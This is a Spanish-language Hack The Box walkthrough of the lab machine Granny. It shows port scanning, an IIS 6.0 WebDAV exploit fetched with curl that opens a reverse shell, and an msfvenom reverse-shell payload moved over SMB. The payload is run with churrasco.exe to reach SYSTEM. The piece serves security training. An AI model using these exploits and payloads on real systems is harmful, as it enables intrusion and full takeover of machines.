---
title: HackTheBox - Granny
categories: [Windows]
tags: [HackTheBox]
image: granny.png 
img_path: /assets/HTB/Granny/
---

En este post voy a explicar como resolver la máquina Granny de [Hack The Box](https://app.hackthebox.com/machines/14), en la cual vamos a estar explotando una vulnerabilidad de un ```IIS 6.0``` y para la escalada vamos a hacer uso del exploit ```churrasco.exe```

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.25s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan:
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Mon, 12 Dec 2022 00:13:17 GMT
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Como vemos, la página tiene el puertos 80 (HTTP) abierto.

# Enumeración
Al ingresar a la página, vemos esto.

<img src="granny-pagina.png">

Si usamos la herramienta whatweb para recopilar información del servidor web, vemos que se está utilizando ```Microsoft-IIS[6.0]```.

```
$ whatweb http://10.10.10.15/

HTTPServer[Microsoft-IIS/6.0], IP[10.10.10.15], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]
```

Esta versión del ```IIS``` es vulnerable a ```ejecución de código arbitrario```, para explotarlo vamos a hacer uso de este [exploit](https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell) creado por ```g0rx```, el cual nos mandara directamente una ```reverse shell```.

# Reverse Shell

```
$ curl -s  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell -o IIS-exploit.py

$ python2 IIS-exploit.py 10.10.10.15 80 [Reverse IP] [Reverse Port]

```
```
$ rlwrap nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.15] 1031
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv> whoami

nt authority\network service
```
# Enumeración del sistema
Al hacer un ```whoami /priv```, veremos que tenemos el privilegio ```SeImpersonatePrivilege```, el cual podemos abusar haciendo uso del exploit ```churrasco.exe```, una alternativa al ```JuicyPotato.exe```, usaremos esa alternativa, ya que en algunos escenarios, el exploit JuicyPotato no es compatible con los sistemas más antiguos.

Lo primero que vamos a hacer es descargarnos el exploit ```churrasco.exe``` y crearnos un archivo malicioso haciendo uso de msfvenom el cual se encargue de mandarnos una reverse shell.

```
$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe

No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Una vez creados, los transferiremos a la máquina víctima, haciendo uso de la herramienta ```impacket-smbserver```.

```
$ sudo impacket-smbserver smbFolder $(pwd) -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Una vez este inicializado el servidor SMB en la máquina local, descargaremos los archivo de la siguiente forma.

```
c:\windows\system32\inetsrv>cd C:\Windows\Temp
C:\WINDOWS\Temp>copy \\10.10.14.2\smbFolder\churrasco.exe churrasco.exe
        1 file(s) copied.

C:\WINDOWS\Temp>copy \\10.10.14.2\smbFolder\shell.exe shell.exe
        1 file(s) copied.

C:\WINDOWS\Temp>dir

 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\WINDOWS\Temp

12/12/2022  03:50 AM    <DIR>          .
12/12/2022  03:50 AM    <DIR>          ..
12/12/2022  03:38 AM            31,232 churrasco.exe
04/12/2017  09:14 PM    <DIR>          rad61C21.tmp
04/12/2017  09:14 PM    <DIR>          radDDF39.tmp
12/12/2022  03:44 AM            73,802 shell.exe
02/18/2007  02:00 PM            22,752 UPD55.tmp
12/24/2017  07:24 PM    <DIR>          vmware-SYSTEM
12/12/2022  02:07 AM            25,552 vmware-vmsvc.log
09/16/2021  01:54 PM             4,679 vmware-vmusr.log
12/12/2022  02:08 AM               728 vmware-vmvss.log
               6 File(s)        158,745 bytes
               5 Dir(s)   1,323,311,104 bytes free

C:\WINDOWS\Temp>
```
# Escalada de privilegios

Ahora nos pondremos en escucha por el puerto que le especificamos en el archivo malicioso, y lo ejecutaremos haciendo uso del exploit ```churrasco.exe``` para que nos llegue una reverse shell como ```nt authority\system```.

```
C:\WINDOWS\Temp>churrasco.exe
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"

C:\WINDOWS\Temp>churrasco.exe -d ".\shell.exe"
/churrasco/-->Current User: NETWORK SERVICE
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

```
$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.15] 1036
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
nt authority\system
```
